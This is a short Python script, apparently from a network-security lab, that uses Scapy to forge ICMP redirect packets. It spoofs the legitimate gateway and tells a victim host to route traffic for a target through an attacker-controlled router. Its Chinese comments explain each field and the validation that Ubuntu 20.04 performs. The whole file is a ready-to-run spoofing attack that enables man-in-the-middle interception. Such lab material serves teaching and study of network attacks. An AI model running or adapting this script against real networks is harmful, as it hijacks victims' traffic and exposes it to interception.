#!/usr/bin/python3
from scapy.all import IP, ICMP, send

# 构造外层IP包：伪装成正常网关(10.9.0.11)发给受害者(10.9.0.5)
ip = IP(src="10.9.0.11", dst="10.9.0.5")

# 构造ICMP重定向包：type=5(重定向), code=1(主机重定向)
# gw字段指定新的网关为恶意路由器(10.9.0.111)
icmp = ICMP(type=5, code=1)
icmp.gw = "10.9.0.111"

# 封装触发重定向的"原始数据包"：模拟受害者发给目标的IP包
# Ubuntu 20.04仅验证该包的源IP、目的IP和协议类型
ip2 = IP(src="10.9.0.5", dst="192.168.60.5")

# 发送完整的ICMP重定向包（内层附加空ICMP层模拟ping请求）
send(ip/icmp/ip2/ICMP(), count=3, inter=0.5)
print("[+] ICMP重定向包已发送，目标网关：10.9.0.111")